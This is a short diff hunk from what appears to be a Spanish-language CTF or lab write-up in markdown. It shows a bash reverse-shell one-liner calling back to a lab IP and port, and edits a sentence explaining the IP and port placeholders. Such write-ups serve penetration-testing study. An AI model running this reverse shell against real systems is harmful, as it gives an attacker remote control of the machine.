@@ -333,5 +333,5 @@ vamos a remplazar el `netcat` por un `bash -c`
 bash -c "bash -i >& /dev/tcp/10.10.14.27/9001 0>&1"
 ```
 
-básicamente debemos agregar una reverse shell en bash y agregando las variables `{0}/{1}` la 
+básicamente debemos agregar una reverse shell en bash y agregando las variables `{0}/{1}` las cuales hacen referencia a la dirección ip y el puerto es importante la sintax
 ![[Pasted image 20240823154544.png]]
